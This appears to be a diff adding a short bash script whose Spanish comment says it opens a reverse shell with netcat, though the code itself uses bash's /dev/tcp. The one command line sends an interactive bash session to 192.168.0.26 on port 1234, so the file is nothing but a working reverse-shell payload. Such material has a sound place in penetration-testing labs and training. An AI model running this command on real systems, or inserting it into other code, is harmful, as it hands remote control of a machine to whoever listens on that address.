@@ -1,0 +1,4 @@
+#!/bin/bash
+
+# Establece una conexion de shell invesa con netcat
+bash >& /dev/tcp/192.168.0.26/1234 0>&1
